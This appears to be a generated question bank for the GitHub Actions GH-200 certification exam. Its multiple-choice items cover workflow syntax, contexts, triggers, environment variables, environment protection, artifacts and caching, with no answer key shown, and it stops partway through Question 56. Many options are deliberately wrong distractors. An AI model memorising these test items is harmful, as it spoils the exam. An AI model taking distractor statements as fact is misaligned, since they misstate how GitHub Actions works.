# GitHub Actions GH-200 Certification Exam — Question Bank (Iteration 10)

**Iteration**: 10

**Generated**: 2026-03-22

**Total Questions**: 100

**Difficulty Split**: 16 Easy / 80 Medium / 4 Hard

**Answer Types**: 100 `one`


---

## Questions

---

### Question 1 — VS Code Extension

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Schema validation source

**Question**:
The GitHub Actions VS Code extension validates workflow YAML files against a schema. Where does it source the schema from?

- A) A locally bundled static schema file that ships with the extension
- B) GitHub's official JSON schema for GitHub Actions workflow files, kept up to date by the extension
- C) The developer must manually download and reference a schema file in `.vscode/settings.json`
- D) It validates against the YAML 1.2 specification only — no GitHub-specific schema is applied

---

### Question 2 — VS Code Extension

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Action hover metadata

**Scenario**:
A developer is writing a workflow and pauses on the line `uses: actions/cache@v3`. They want to quickly check what inputs are required and what outputs are produced without opening a browser.

**Question**:
Which VS Code extension feature provides this information directly in the editor?

- A) Pressing `F12` to jump to the action's `action.yml` definition file on the local filesystem
- B) Hovering over the action reference displays the action's metadata including name, description, inputs, and outputs from the remote `action.yml`
- C) Right-clicking and selecting "GitHub Actions: Show Action Details" from the context menu opens a dedicated panel
- D) The extension auto-generates a comment block above the `uses:` line with the action's README excerpt

---

### Question 3 — VS Code Extension

**Difficulty**: Medium
**Answer Type**: one
**Topic**: IntelliSense for contexts

**Scenario**:
A developer types `${{ github.` inside a workflow `if:` condition and sees a dropdown list of suggestions. They select `github.event_name` and continue typing ` == '` and see string suggestions appear.

**Question**:
What VS Code extension feature is providing these contextual suggestions?

- A) GitHub Copilot AI completions are inferring likely event names from the repository history
- B) The extension's IntelliSense integration with the GitHub Actions schema provides context-aware property completions including available values for known context properties
- C) The YAML language server is providing generic string completions from the current file
- D) The extension queries the GitHub API for the list of valid event names using the developer's authenticated session

---

### Question 4 — VS Code Extension

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Error highlighting and fixing

**Scenario**:
A developer writes a workflow step with an `if:` condition that has unbalanced expression delimiters (`${{ github.ref == 'main'`). The extension immediately highlights the line in red.

**Question**:
At what point does the extension detect and display this syntax error, and what action is required from the developer to see it?

- A) Only after saving the file — the extension validates on save events only
- B) In real time as the developer types — no save or manual action is required because validation runs continuously on the open editor buffer
- C) Only after committing the file — the extension hooks into the git pre-commit hook
- D) After a 30-second delay — the extension batches validation to reduce compute overhead

---

### Question 5 — VS Code Extension

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Required VS Code extension dependency

**Question**:
The GitHub Actions VS Code extension requires which other VS Code extension to be installed to provide its full YAML language support?

- A) The GitHub Pull Requests and Issues extension
- B) The YAML extension (by Red Hat)
- C) The Docker extension
- D) The GitLens extension

---

### Question 6 — Contextual Information

**Difficulty**: Easy
**Answer Type**: one
**Topic**: github.event_name usage

**Question**:
A workflow is triggered by both `push` and `pull_request` events. A step needs to behave differently depending on which event triggered the run. Which context property provides the name of the triggering event?

- A) `github.trigger`
- B) `github.action`
- C) `github.event_name`
- D) `github.event.type`

---

### Question 7 — Contextual Information

**Difficulty**: Medium
**Answer Type**: one
**Topic**: github.ref vs github.ref_name format

**Scenario**:
A deployment script checks if the current ref is the `main` branch using: `if [ "$GITHUB_REF" = "main" ]; then`. The condition never evaluates to true even on the main branch.

**Question**:
What is the cause and how should it be fixed?

- A) `GITHUB_REF` is not available in `run:` steps; use `github.ref_name` context expression instead
- B) `GITHUB_REF` contains the full ref path (e.g., `refs/heads/main`), not just `main`; use `GITHUB_REF_NAME` or compare against `refs/heads/main`
- C) Shell variables from the `github` context must be prefixed with `INPUT_`; use `INPUT_GITHUB_REF`
- D) The comparison requires double brackets: `if [[ "$GITHUB_REF" = "main" ]]` — single brackets do not work with GitHub variables

---

### Question 8 — Contextual Information

**Difficulty**: Medium
**Answer Type**: one
**Topic**: github.sha in deployment context

**Scenario**:
A Kubernetes deployment workflow needs to tag a Docker image with the exact commit SHA that triggered the build to enable precise rollbacks.

**Question**:
Which context expression provides the full 40-character commit SHA of the triggering commit?

- A) `${{ github.commit }}`
- B) `${{ github.sha }}`
- C) `${{ github.ref_sha }}`
- D) `${{ github.event.head_commit.id }}`

---

### Question 9 — Contextual Information

**Difficulty**: Medium
**Answer Type**: one
**Topic**: job context — job.status

**Scenario**:
A notification step at the end of a job should send a Slack message with the final job status (success, failure, or cancelled). The step uses `if: always()` to ensure it always runs.

**Question**:
Which expression retrieves the job's final status for use in the notification message?

- A) `${{ runner.status }}`
- B) `${{ github.job_status }}`
- C) `${{ job.status }}`
- D) `${{ steps.final.outcome }}`

---

### Question 10 — Contextual Information

**Difficulty**: Medium
**Answer Type**: one
**Topic**: vars context vs secrets context

**Scenario**:
A team stores non-sensitive configuration values (like an API base URL) in their repository's "Variables" settings and sensitive credentials in "Secrets". A developer wants to reference the API URL in a workflow expression.

**Question**:
Which context provides access to repository/organization variables (non-secret configuration values)?

- A) `${{ env.API_BASE_URL }}` — environment variables serve this purpose
- B) `${{ vars.API_BASE_URL }}` — the `vars` context exposes repository and organization variables
- C) `${{ secrets.API_BASE_URL }}` — all configuration including non-sensitive values should use secrets
- D) `${{ github.variables.API_BASE_URL }}` — variables are sub-properties of the `github` context

---

### Question 11 — Context Availability Reference

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Contexts unavailable in workflow-level env

**Question**:
A developer wants to set a workflow-level environment variable using the `job` context: `env: JOB_CONTAINER: ${{ job.container.id }}`. Why will this fail?

- A) The `job` context is not available in the workflow-level `env:` key; only `github`, `inputs`, and `vars` are available there
- B) The `job.container.id` property does not exist in the `job` context
- C) Workflow-level `env:` does not support any context expressions at all
- D) The `job` context requires the `runs-on: container:` syntax to be populated

---

### Question 12 — Context Availability Reference

**Difficulty**: Medium
**Answer Type**: one
**Topic**: steps context availability

**Scenario**:
A developer wants to check the output of a previous step named `build` inside the `if:` condition of a later step: `if: steps.build.outputs.exit-code == '0'`.

**Question**:
Is the `steps` context available in `jobs.<job_id>.steps[*].if:`, and what is the correct expression syntax?

- A) No — the `steps` context is only available in `steps[*].run:`, not in `steps[*].if:`
- B) Yes — `steps` context is available in step `if:` conditions; correct syntax is `${{ steps.build.outputs.exit-code == '0' }}`
- C) Yes — but only for steps that completed before the current step; syntax is `if: ${{ steps.build.outputs.exit-code == '0' }}`
- D) No — step output comparisons in `if:` require using the `needs` context pattern instead

---

### Question 13 — Context Availability Reference

**Difficulty**: Medium
**Answer Type**: one
**Topic**: jobs.outputs context

**Scenario**:
A `build` job sets an output `image-tag` using `$GITHUB_OUTPUT`. A downstream `deploy` job (with `needs: build`) needs to read this output.

**Question**:
Which expression correctly reads the `image-tag` output from the `build` job in the `deploy` job?

- A) `${{ jobs.build.outputs.image-tag }}`
- B) `${{ needs.build.outputs.image-tag }}`
- C) `${{ steps.build.outputs.image-tag }}`
- D) `${{ outputs.build.image-tag }}`

---

### Question 14 — Context Availability Reference

**Difficulty**: Medium
**Answer Type**: one
**Topic**: matrix context in steps

**Scenario**:
A matrix job runs across `[node-18, node-20, node-22]`. Each step in the job needs to reference the current matrix value to log which Node.js version is being tested.

**Question**:
Which expression accesses the current matrix value inside a `run:` step?

- A) `${{ strategy.matrix.node-version }}`
- B) `${{ matrix.node-version }}`
- C) `${{ runner.matrix.node-version }}`
- D) `${{ github.matrix.node-version }}`

---

### Question 15 — Context Availability Reference

**Difficulty**: Medium
**Answer Type**: one
**Topic**: inputs context in reusable workflows

**Scenario**:
A reusable workflow declares an input `deploy-env`. Inside a step's `run:` command, the developer wants to use the value of this input.

**Question**:
Which expression correctly accesses this input inside the reusable workflow's step?

- A) `${{ github.event.inputs.deploy-env }}`
- B) `${{ inputs.deploy-env }}`
- C) `${{ vars.deploy-env }}`
- D) `${{ workflow.inputs.deploy-env }}`

---

### Question 16 — Workflow File Structure

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Mandatory workflow keys

**Question**:
Which top-level key is mandatory in every GitHub Actions workflow file?

- A) `name:`
- B) `env:`
- C) `on:`
- D) `defaults:`

---

### Question 17 — Workflow File Structure

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Multiple event triggers

**Scenario**:
A workflow should trigger on both `push` to `main` and on any `pull_request` opened against any branch. The developer needs to combine these two triggers in a single workflow.

**Question**:
Which `on:` configuration correctly combines both triggers?

- A) `on: [push, pull_request]` with no filter (triggers on all pushes and all PRs)
- B) `on: push: branches: [main] on: pull_request:` — two separate `on:` keys
- C) `on: push: branches: [main] pull_request:` — map syntax combining both events under a single `on:` key
- D) Both A and C are correct depending on whether filters are needed

---

### Question 18 — Workflow File Structure

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Job dependency with needs

**Scenario**:
A workflow has three jobs: `lint`, `test`, and `deploy`. The `deploy` job must only run after both `lint` and `test` complete successfully.

**Question**:
Which `needs:` configuration on the `deploy` job enforces this dependency?

- A) `needs: lint, test` (comma-separated string)
- B) `needs: [lint, test]` (array syntax)
- C) `depends-on: [lint, test]`
- D) `after: [lint, test]`

---

### Question 19 — Workflow File Structure

**Difficulty**: Medium
**Answer Type**: one
**Topic**: continue-on-error job behavior

**Scenario**:
A team runs an experimental job in their CI pipeline. They want the overall workflow to be marked as successful even if this experimental job fails, so other required jobs are not blocked.

**Question**:
Which configuration on the experimental job achieves this?

- A) `ignore-failure: true` at the job level
- B) `continue-on-error: true` at the job level
- C) `fail-fast: false` at the job level
- D) `if: always()` on the job level

---

### Question 20 — Workflow File Structure

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Job-level environment

**Scenario**:
A deployment job needs to target the `staging` environment and have the deployed URL `https://staging.example.com` appear in the Deployments section.

**Question**:
Which job-level configuration achieves both requirements?

- A) `env: ENVIRONMENT: staging DEPLOY_URL: https://staging.example.com`
- B) `environment: name: staging url: https://staging.example.com`
- C) `on: deployment: name: staging url: https://staging.example.com`
- D) `uses: actions/deploy@v1 with: environment: staging url: https://staging.example.com`

---

### Question 21 — Workflow File Structure

**Difficulty**: Medium
**Answer Type**: one
**Topic**: strategy.matrix definition

**Scenario**:
A test workflow needs to run against three OS/Node combinations: Ubuntu with Node 18, Ubuntu with Node 20, and macOS with Node 20. Only these three specific combinations should run.

**Question**:
Which matrix configuration produces exactly these three combinations?

- A) `matrix: os: [ubuntu-latest, macos-latest] node: [18, 20]` — produces 4 combinations (includes macOS+Node 18)
- B) `matrix: include: [{os: ubuntu-latest, node: 18}, {os: ubuntu-latest, node: 20}, {os: macos-latest, node: 20}]` — uses `include` to define exact combinations
- C) `matrix: os: [ubuntu-latest, macos-latest] node: [18, 20] exclude: [{os: macos-latest, node: 18}]` — excludes the unwanted combo
- D) Both B and C produce exactly these three combinations

---

### Question 22 — Workflow File Structure

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Workflow-level permissions

**Scenario**:
A security review flags that a workflow inherits too-broad default permissions. The security team wants to set `read-only` permissions as the workflow default, then grant specific jobs only the minimum write access they need.

**Question**:
Which configuration sets read-only as the default and allows per-job overrides?

- A) `defaults: permissions: read-all` at the workflow level with `permissions:` blocks on individual jobs
- B) `permissions: read-all` at the workflow level, then override with explicit `permissions:` blocks at the job level
- C) `security: permissions: restricted` at the workflow level
- D) Workflow-level permissions cannot be overridden at the job level — they apply uniformly

---

### Question 23 — Workflow Trigger Events

**Difficulty**: Easy
**Answer Type**: one
**Topic**: pull_request default activity types

**Question**:
When a workflow uses `on: pull_request:` without specifying `types:`, which pull request activity types trigger the workflow by default?

- A) Only `opened`
- B) `opened`, `synchronize`, and `reopened`
- C) All pull request activity types including `closed`, `labeled`, and `assigned`
- D) `opened` and `closed` only

---

### Question 24 — Workflow Trigger Events

**Difficulty**: Medium
**Answer Type**: one
**Topic**: push tag filter

**Scenario**:
A changelog generation workflow should run whenever any tag is pushed, regardless of the tag's naming convention.

**Question**:
Which `push` trigger configuration fires on any tag push?

- A) `on: push: refs: ["refs/tags/**"]`
- B) `on: push: tags: ["*"]`
- C) `on: create: types: [tag]`
- D) `on: push: filter: tags: true`

---

### Question 25 — Workflow Trigger Events

**Difficulty**: Medium
**Answer Type**: one
**Topic**: workflow_dispatch input defaults

**Scenario**:
A workflow exposed via `workflow_dispatch` has an input `log-level` with a default of `info`. An operator triggers the workflow manually without providing the input.

**Question**:
What value does `inputs.log-level` have during the run?

- A) Empty string — defaults are only applied if the workflow file also sets a matching `env:` variable
- B) `info` — the default value specified in the `workflow_dispatch` input definition is used when no value is provided
- C) `null` — undefined inputs always resolve to null in the `inputs` context
- D) An error is thrown — workflow dispatch inputs are always required unless `required: false` is set with no default

---

### Question 26 — Workflow Trigger Events

**Difficulty**: Medium
**Answer Type**: one
**Topic**: pull_request branches filter

**Scenario**:
A quality gate workflow should run on PRs targeting `main` or any `release/*` branch, but not on PRs targeting feature branches.

**Question**:
Which trigger configuration enforces this?

- A) `on: pull_request: branches: [main, release/*]`
- B) `on: pull_request: target-branches: [main, "release/**"]`
- C) `on: pull_request: base: [main, "release/*"]`
- D) `on: pull_request: branches: [main, "release/**"]`

---

### Question 27 — Workflow Trigger Events

**Difficulty**: Medium
**Answer Type**: one
**Topic**: workflow_run conclusion filtering

**Scenario**:
A documentation publishing workflow should only start when the upstream `Build Docs` workflow completes successfully, not on failure or cancellation.

**Question**:
How should the `workflow_run` trigger be combined with a condition to achieve this?

- A) `on: workflow_run: workflows: ["Build Docs"] types: [completed] conclusions: [success]`
- B) `on: workflow_run: workflows: ["Build Docs"] types: [success]`
- C) `on: workflow_run: workflows: ["Build Docs"] types: [completed]` combined with `if: github.event.workflow_run.conclusion == 'success'` on the job
- D) `on: workflow_run: workflows: ["Build Docs"] types: [completed] filter: conclusion: success`

---

### Question 28 — Workflow Trigger Events

**Difficulty**: Medium
**Answer Type**: one
**Topic**: schedule cron — UTC timezone

**Scenario**:
A team in UTC-5 wants to run a daily cleanup workflow at 8:00 AM their local time (which is 13:00 UTC).

**Question**:
Which cron expression in a GitHub Actions schedule trigger runs the workflow at 13:00 UTC daily?

- A) `cron: "0 8 * * *"` — uses local time automatically
- B) `cron: "0 13 * * *"` — GitHub Actions schedules run in UTC
- C) `cron: "13 0 * * *"` — hour and minute are reversed in GitHub cron syntax
- D) `cron: "0 13 * * * UTC"` — UTC must be explicitly specified in the cron string

---

### Question 29 — Workflow Trigger Events

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Trigger interaction — push + pull_request on same branch push

**Scenario**:
A repository has two workflows: Workflow A triggers on `on: push: branches: [main]` and Workflow B triggers on `on: pull_request: branches: [main]`. A developer merges a PR into `main`.

**Question**:
Which workflow(s) run when the merge commit is created on `main`?

- A) Only Workflow B — merging a PR is a pull_request event
- B) Only Workflow A — a merge creates a push event to `main`; the PR is already closed so Workflow B does not fire
- C) Both Workflow A and Workflow B — a merge triggers both a push and a pull_request closed event
- D) Neither — merge events require `on: pull_request: types: [closed]` to trigger

---

### Question 30 — Custom Environment Variables

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Accessing custom env vars in run steps

**Question**:
A workflow defines `env: BUILD_MODE: release` at the workflow level. How does a bash `run:` step access this value as a shell variable?

- A) `${{ env.BUILD_MODE }}` — context expression syntax is required inside `run:` commands
- B) `$BUILD_MODE` — custom env vars at workflow/job/step level are available as OS environment variables in the shell
- C) `$(env BUILD_MODE)` — the `env` command must be used to retrieve workflow environment variables
- D) `%BUILD_MODE%` — GitHub Actions uses Windows-style environment variable syntax

---

### Question 31 — Custom Environment Variables

**Difficulty**: Medium
**Answer Type**: one
**Topic**: env var precedence across three levels

**Scenario**:
A workflow defines:
- Workflow level: `DEBUG: false`
- Job level: `DEBUG: true`
- Step level: `DEBUG: verbose`

What value does the shell variable `$DEBUG` have inside that step?

- A) `false` — workflow level always wins
- B) `true` — job level overrides workflow level
- C) `verbose` — step level is the most specific and overrides both job and workflow level
- D) An error — the same variable cannot be defined at multiple levels

---

### Question 32 — Custom Environment Variables

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Dynamic env vars from command output

**Scenario**:
A step needs to capture the output of a shell command (`git describe --tags`) and store it as an environment variable named `RELEASE_TAG` that subsequent steps can use.

**Question**:
Which approach correctly captures command output into a persistent environment variable?

- A) `RELEASE_TAG=$(git describe --tags)` in a `run:` command — bash variable assignment persists automatically
- B) `echo "RELEASE_TAG=$(git describe --tags)" >> $GITHUB_ENV` in a `run:` command
- C) `export RELEASE_TAG=$(git describe --tags)` — `export` makes the variable available to subsequent steps
- D) Set `outputs: RELEASE_TAG: $(git describe --tags)` in the step YAML

---

### Question 33 — Custom Environment Variables

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Referencing secrets for environment variables

**Scenario**:
A step needs to authenticate to a private npm registry using `NPM_TOKEN`. The token is stored as a repository secret. The developer wants to follow security best practices.

**Question**:
Which configuration correctly maps the secret to an environment variable for use in the step?

- A) `run: npm publish env: NPM_TOKEN=${{ secrets.NPM_TOKEN }}`
- B) At step level: `env: NPM_TOKEN: ${{ secrets.NPM_TOKEN }}` — then reference `$NPM_TOKEN` in the `run:` command
- C) At workflow level: `env: NPM_TOKEN: ${{ secrets.NPM_TOKEN }}` — workflow-level env is the recommended location for secrets
- D) No special configuration; secrets are automatically available as `${{ secrets.NPM_TOKEN }}` in all `run:` commands

---

### Question 34 — Custom Environment Variables

**Difficulty**: Medium
**Answer Type**: one
**Topic**: env context vs shell environment variable

**Scenario**:
A developer needs to reference a workflow-level `env` variable inside an expression used in a `with:` input for an action: `with: version: ${{ env.APP_VERSION }}`.

**Question**:
Is the `env` context available in `steps[*].with:`, and how does this differ from accessing it in a `run:` step?

- A) No — `env` context is only available in `run:` steps; use a step output to pass values to `with:` inputs
- B) Yes — `env` context is available in `steps[*].with:` as a context expression (`${{ env.APP_VERSION }}`); in `run:` steps the same value is also accessible as the OS environment variable `$APP_VERSION`
- C) Yes — but the syntax differs: use `$ENV.APP_VERSION` in `with:` and `$APP_VERSION` in `run:`
- D) No — `env` context is never available in action `with:` inputs; use `inputs:` at the workflow level instead

---

### Question 35 — Default Environment Variables

**Difficulty**: Easy
**Answer Type**: one
**Topic**: GITHUB_WORKSPACE

**Question**:
Which default environment variable contains the absolute path to the directory where the repository is checked out on the runner?

- A) `GITHUB_REPO_PATH`
- B) `RUNNER_TEMP`
- C) `GITHUB_WORKSPACE`
- D) `RUNNER_WORKSPACE`

---

### Question 36 — Default Environment Variables

**Difficulty**: Medium
**Answer Type**: one
**Topic**: GITHUB_REF_TYPE

**Scenario**:
A release script behaves differently depending on whether it was triggered by a branch push or a tag push. The script checks the `GITHUB_REF_TYPE` variable.

**Question**:
What are the two possible values of `GITHUB_REF_TYPE`, and which value indicates a tag push?

- A) `branch` or `tag` — value `tag` indicates a tag push
- B) `heads` or `tags` — value `tags` indicates a tag push (mirrors the `refs/` path prefix)
- C) `push` or `release` — value `release` indicates a tag push
- D) `commit` or `tag` — value `tag` indicates a tag push

---

### Question 37 — Default Environment Variables

**Difficulty**: Medium
**Answer Type**: one
**Topic**: RUNNER_OS usage

**Scenario**:
A cross-platform workflow runs on both `ubuntu-latest` and `windows-latest`. A step needs to conditionally install different tools depending on the OS without using separate jobs.

**Question**:
Which environment variable and check correctly identifies the runner OS in a bash/PowerShell script?

- A) Check `$GITHUB_RUNNER_OS` — the dedicated runner OS variable
- B) Check `$RUNNER_OS` — contains values like `Linux`, `Windows`, or `macOS`
- C) Check `$GITHUB_PLATFORM` — set to `linux`, `win32`, or `darwin`
- D) Check `$OS` — the standard OS environment variable available on all platforms

---

### Question 38 — Default Environment Variables

**Difficulty**: Medium
**Answer Type**: one
**Topic**: GITHUB_API_URL and GITHUB_SERVER_URL

**Scenario**:
A step in a workflow needs to construct a URL to the repository's GitHub API endpoint. The workflow must also work on GitHub Enterprise Server (GHES) instances with custom domains.

**Question**:
Which environment variable should be used to construct the API base URL to ensure compatibility with both GitHub.com and GHES?

- A) Hard-code `https://api.github.com` — GHES users must override this in environment settings
- B) Use `$GITHUB_API_URL` — this variable is automatically set to the correct API endpoint for both GitHub.com and GHES
- C) Use `$GITHUB_SERVER_URL/api/v3` — append the API path to the server URL
- D) Use `$GITHUB_GRAPHQL_URL` — the GraphQL endpoint also responds to REST API calls

---

### Question 39 — Default Environment Variables

**Difficulty**: Medium
**Answer Type**: one
**Topic**: GITHUB_JOB variable

**Scenario**:
A monitoring step at the end of each job sends telemetry including the job name for categorization in a metrics dashboard.

**Question**:
Which default environment variable contains the job's ID (as defined in the workflow YAML) during execution?

- A) `GITHUB_WORKFLOW_JOB`
- B) `GITHUB_JOB`
- C) `RUNNER_JOB_ID`
- D) `GITHUB_RUN_JOB`

---

### Question 40 — Environment Protection Rules

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Maximum number of required reviewers

**Question**:
When configuring Required Reviewers for a GitHub environment, what is the maximum number of reviewers that can be added?

- A) 1 reviewer only — GitHub allows one approval gate per environment
- B) Up to 6 reviewers (users or teams)
- C) Unlimited — any number of users or teams can be added
- D) Up to 10 reviewers (users or teams)

---

### Question 41 — Environment Protection Rules

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Self-review restriction

**Scenario**:
Developer Alice pushes code to `main` triggering a deployment workflow. Alice is also listed as a required reviewer for the `production` environment. She attempts to approve her own deployment.

**Question**:
What happens when Alice tries to self-approve the deployment?

- A) The approval succeeds — reviewers can always approve any deployment including their own
- B) GitHub blocks self-approval by default — the person who triggered the workflow cannot be the approving reviewer
- C) The approval goes into a 24-hour hold period for audit purposes before taking effect
- D) Self-approval is allowed only if Alice is the sole reviewer; with multiple reviewers it is blocked

---

### Question 42 — Environment Protection Rules

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Environment secrets scoping

**Scenario**:
A workflow deploys to `staging` and `production` environments in separate jobs. Both environments have a secret named `DATABASE_URL` with different values. The `staging` job accesses `${{ secrets.DATABASE_URL }}`.

**Question**:
Which database URL value does the `staging` job receive?

- A) The repository-level `DATABASE_URL` secret — environment secrets are only used when explicitly prefixed
- B) The `staging` environment's `DATABASE_URL` secret — environment-scoped secrets are injected into jobs that declare that specific environment, taking precedence over repository-level secrets with the same name
- C) Both values — GitHub concatenates environment and repository secrets with the same name
- D) An error — having the same secret name at both environment and repository level causes a conflict

---

### Question 43 — Environment Protection Rules

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Deployment branch restriction — protected branches only

**Scenario**:
An organization wants to ensure that only code that has passed branch protection rules (code review, status checks) can be deployed to production. They want to avoid manually listing branch names.

**Question**:
Which deployment branch restriction option automatically enforces this without naming specific branches?

- A) "All Branches" — lets any branch deploy but relies on PR review gates
- B) "Protected Branches Only" — automatically limits deployment to branches that have protection rules enabled
- C) "Named branches" with `main` — requires explicitly listing protected branches
- D) "Tag-only" — requires all deployments to come from immutable version tags

---

### Question 44 — Environment Protection Rules

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Reviewer notification mechanism

**Scenario**:
A production deployment is waiting for review. A developer reports that the required reviewer (Bob) did not receive any notification and the deployment has been pending for 2 hours.

**Question**:
Through which channels does GitHub notify required reviewers when a deployment is awaiting their approval?

- A) Only through the GitHub Actions tab in the repository — no email or external notifications are sent
- B) GitHub sends email notifications to the reviewer and creates an in-app notification; reviewers can also see pending deployments on their GitHub notifications page
- C) Only through a push notification to the GitHub mobile app if installed
- D) Through a webhook POST to the reviewer's configured notification URL in their profile settings

---

### Question 45 — Workflow Artifacts

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Artifact name uniqueness within a run

**Question**:
A workflow has two jobs that each upload an artifact with the same name `test-results`. What happens?

- A) The second upload appends to the first artifact, creating a combined archive
- B) The second upload overwrites the first artifact — names must be unique within a workflow run to avoid conflicts
- C) The workflow fails with an error when the second upload attempts to use a duplicate artifact name
- D) Both artifacts are stored with auto-generated suffixes (e.g., `test-results-1`, `test-results-2`)

---

### Question 46 — Workflow Artifacts

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Artifact download path

**Scenario**:
A job downloads an artifact named `build-output` using `actions/download-artifact@v3`. The developer does not specify a `path:` input. Where are the artifact files placed?

- A) In `$RUNNER_TEMP/artifacts/build-output/`
- B) In the current working directory under a subdirectory named after the artifact: `./build-output/`
- C) In `$GITHUB_WORKSPACE/artifacts/`
- D) In the root workspace directory (`$GITHUB_WORKSPACE`) with no subdirectory

---

### Question 47 — Workflow Artifacts

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Artifact retention-days configuration

**Scenario**:
Compliance requires that build artifacts for audited releases be retained for 365 days. A developer attempts to set `retention-days: 365` in `upload-artifact@v3`.

**Question**:
What determines the maximum allowed retention period, and what happens if the specified value exceeds it?

- A) The maximum is always 90 days; values above 90 are silently clamped to 90
- B) The maximum retention period is set by the organization or repository admin (up to 90 days on free plans, up to 400 days on paid plans); if the specified value exceeds the configured maximum, the configured maximum is used
- C) There is no maximum — any number of days can be specified and GitHub honors it
- D) The maximum is 30 days for all plans; use GitHub Releases instead for long-term artifact storage

---

### Question 48 — Workflow Artifacts

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Using artifacts for cross-job test coverage

**Scenario**:
A CI pipeline has a `test-unit` job and a `test-integration` job running in parallel. A `coverage-report` job must combine results from both into a single report.

**Question**:
What is the correct workflow structure to collect both test results in the coverage job?

- A) Use `strategy.matrix` to combine both test jobs into one job, then generate the report
- B) Both test jobs upload artifacts; the `coverage-report` job declares `needs: [test-unit, test-integration]` and downloads both artifact sets
- C) Use `jobs.<job>.outputs` to pass test results as strings; the coverage job reads them via `needs` context
- D) The `coverage-report` job must run on the same runner as both test jobs to share the filesystem

---

### Question 49 — Workflow Artifacts

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Artifact access post-workflow

**Scenario**:
A QA engineer wants to download a build artifact from a workflow run from 3 days ago to reproduce a reported bug. The artifact has a 5-day retention period.

**Question**:
How can the QA engineer access the artifact?

- A) Artifacts can only be downloaded during an active workflow run; after the run completes, they expire immediately
- B) Navigate to Repository → Actions → [workflow run] → Artifacts section at the bottom of the run summary to download
- C) Use `actions/download-artifact` in a new manual workflow run referencing the original `run-id`
- D) Open a GitHub Support ticket to request artifact restoration from backup storage

---

### Question 50 — Workflow Artifacts

**Difficulty**: Medium
**Answer Type**: one
**Topic**: if-no-files-found option

**Scenario**:
A test job uploads a coverage artifact using `upload-artifact`. On a code path where tests are skipped (e.g., a docs-only PR), the coverage file is never generated. The developer wants the upload step to silently succeed even when no files match.

**Question**:
Which `upload-artifact` input controls behavior when no files match the path pattern?

- A) `skip-if-empty: true`
- B) `if-no-files-found: ignore` (default is `warn`; options are `warn`, `error`, `ignore`)
- C) `required: false`
- D) `continue-on-error: true` on the step level (not an action input)

---

### Question 51 — Workflow Caching

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Cache scope — same branch access

**Question**:
A workflow on branch `feature/login` creates a cache entry. Which branches can access this cache entry?

- A) Only the `feature/login` branch itself
- B) `feature/login` branch and the repository's default branch only
- C) `feature/login` branch, plus any branch can fall back to the default branch's cache; the `feature/login` cache itself is only directly accessible from that branch
- D) All branches in the repository can access any cache entry regardless of which branch created it

---

### Question 52 — Workflow Caching

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Cache key — multiple hashFiles inputs

**Scenario**:
A Python project uses both `requirements.txt` and `constraints.txt` to pin dependencies. The developer wants the cache to invalidate when either file changes.

**Question**:
Which cache key expression correctly hashes both files together into a single key component?

- A) `key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt') }}-${{ hashFiles('constraints.txt') }}`
- B) `key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt', 'constraints.txt') }}`
- C) `key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt') + hashFiles('constraints.txt') }}`
- D) `key: ${{ runner.os }}-pip-${{ hashFiles('*.txt') }}`

---

### Question 53 — Workflow Caching

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Post-job cache save behavior

**Scenario**:
A job uses `actions/cache@v3`. The cache key is a miss (no matching cache found), so the job proceeds to install dependencies. The job then fails during the build step (after installation succeeds).

**Question**:
Does the cache get saved at the end of the job despite the job failing?

- A) No — cache is only saved when the job completes successfully
- B) Yes — `actions/cache@v3` saves the cache in a post-job step that runs even if earlier steps failed, as long as the cache restore step itself ran successfully
- C) No — failed jobs are rolled back entirely, including any cache writes
- D) Yes — but the cache is flagged as "dirty" and requires manual validation before use in future runs

---

### Question 54 — Workflow Caching

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Manually deleting caches via API

**Scenario**:
A corrupted cache entry is causing all workflow runs to fail. The developer needs to immediately delete the specific cache entry identified by its key `ubuntu-npm-abc123`.

**Question**:
Besides the GitHub UI (Actions tab → Caches), which API endpoint deletes a specific cache entry by key?

- A) `DELETE /repos/{owner}/{repo}/actions/caches?key=ubuntu-npm-abc123`
- B) `POST /repos/{owner}/{repo}/actions/caches/purge` with body `{"key": "ubuntu-npm-abc123"}`
- C) `DELETE /repos/{owner}/{repo}/actions/runs/{run_id}/caches/{cache_id}`
- D) `PATCH /repos/{owner}/{repo}/actions/caches/{cache_id}` with body `{"status": "deleted"}`

---

### Question 55 — Workflow Caching

**Difficulty**: Medium
**Answer Type**: one
**Topic**: setup-node cache integration

**Scenario**:
A Node.js workflow uses `actions/setup-node@v3`. The developer wants to enable npm caching without writing a separate `actions/cache` step.

**Question**:
Which `setup-node` input enables built-in npm caching?

- A) `cache-npm: true`
- B) `cache: 'npm'`
- C) `enable-cache: true`
- D) `use-cache: npm`

---

### Question 56 — Workflow Caching

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Cache size limits and compression

**Scenario**:
A developer notices that caching the `node_modules` directory (1.8 GB uncompressed) is stored as approximately 400 MB. A colleagues asks how GitHub reduces the stored cache size.

**Question**:
How does GitHub Actions handle cache storage to reduce size?

